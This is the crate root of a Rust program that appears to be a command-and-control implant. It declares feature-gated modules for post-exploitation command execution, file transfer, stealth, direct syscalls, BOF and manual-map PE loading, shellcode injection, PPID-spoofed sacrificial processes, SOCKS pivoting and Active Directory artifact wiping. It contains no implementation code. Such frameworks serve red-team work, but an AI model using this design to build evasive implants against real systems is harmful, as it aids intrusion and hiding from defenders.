#[allow(unused_imports)]
#[macro_use]
extern crate log;

#[cfg(target_os = "windows")]
#[macro_use]
extern crate winapi;

/// Debug print macro — completely eliminated in release builds.
#[macro_export]
macro_rules! dbg_print {
    ($($arg:tt)*) => {
        #[cfg(debug_assertions)]
        {
            log::debug!($($arg)*);
        }
    };
}

pub mod backoff;
pub mod config;
#[cfg(feature = "ws")]
pub mod connection;
pub mod crypto;
pub mod error;
pub mod handler;
pub mod transport;
pub mod types;
pub mod wire_ids;

// --- Post-ex (in product minimal; optional for custom feature sets) ---
#[cfg(feature = "post-ex")]
pub mod executor;
#[cfg(feature = "post-ex")]
pub mod fs;
/// Yamux FILE (0x0E) binary put/get stream (feature-gated with FS).
#[cfg(feature = "post-ex")]
pub mod file_stream;
#[cfg(feature = "post-ex")]
pub mod process;

#[cfg(feature = "pty")]
pub mod pty;
#[cfg(feature = "socks")]
pub mod socks;

#[macro_use]
pub mod utils;

#[cfg(all(feature = "dotnet", target_os = "windows"))]
pub mod dotnet;

#[cfg(feature = "plugin")]
pub mod plugin_router;

#[cfg(feature = "plugin")]
pub mod batch_handler;

pub mod stealth;

#[cfg(feature = "bof")]
pub mod loader;

// Syscall / native helpers (Windows). Stage0 still links a thin subset; heavy BOF
// paths remain behind feature "bof". Further strip planned in Phase 5.
pub mod native;
pub mod syscalls;

// Stage0 module package format + loader (L2 pipeline) — only with module-loader
#[cfg(feature = "module-loader")]
pub mod module_loader;
#[cfg(feature = "module-loader")]
pub mod module_package;
/// Process-isolated workers for product L2 (inject / ad).
/// Stage0 never LoadLibrary/Manual-Map product modules — see docs/MODULE_WORKER_ISOLATION.md.
#[cfg(feature = "module-loader")]
pub mod module_supervisor;
/// Stage0-local AD artifact wipe (path-prefix safe; no worker).
#[cfg(feature = "module-loader")]
pub mod ad_artifact;
/// Manual-Map PE loader for L2 modules (no temp DLL).
/// Product whitelist modules must not use this path (supervisor only).
#[cfg(all(windows, feature = "mem-map"))]
pub mod pe_map;

// PPID-spoofed sacrificial host for BOF/.NET
#[cfg(feature = "isolated-exec")]
pub mod isolated_exec;

// Re-export inject helpers for L2 mod_inject (not linked into Stage0 defaults)
#[cfg(all(windows, feature = "inject"))]
pub use native::{inject_shellcode, wait_inject_thread, InjectResult};

pub mod fallback;

// 重新导出常用类型
pub use backoff::ExponentialBackoff;
pub use config::{
    get_aes_key, get_config_info, get_crypto_config_info, get_dns_resolver, get_heartbeat_interval,
    get_server_url, validate_server_url, ConfigInfo, CryptoConfigInfo,
};
#[cfg(feature = "ws")]
pub use connection::ConnectionManager;
pub use crypto::{decrypt, encrypt};
pub use error::{ClientError, Result};
#[cfg(feature = "post-ex")]
pub use executor::CommandExecutor;
#[cfg(feature = "post-ex")]
pub use fs::{download, ls, upload, FileInfo};
pub use handler::MessageHandler;
pub use transport::{create_transport, Transport};
pub use types::{
    CommandPayload, CommandResult, MessageType, MessageWrapper, RegisterPayload, ResponsePayload,
    SystemInfo,
};

pub use utils::get_agent_uuid;

#[cfg(all(feature = "dotnet", target_os = "windows"))]
pub use dotnet::DotNetExecutor;

#[cfg(feature = "plugin")]
pub use plugin_router::{
    BatchConfig, BatchExecutionManager, BufferedResult, PluginMetadata, PluginRouter, PluginTask,
};

#[cfg(feature = "plugin")]
pub use batch_handler::BatchMessageHandler;

#[cfg(test)]
mod feature_gates_test;
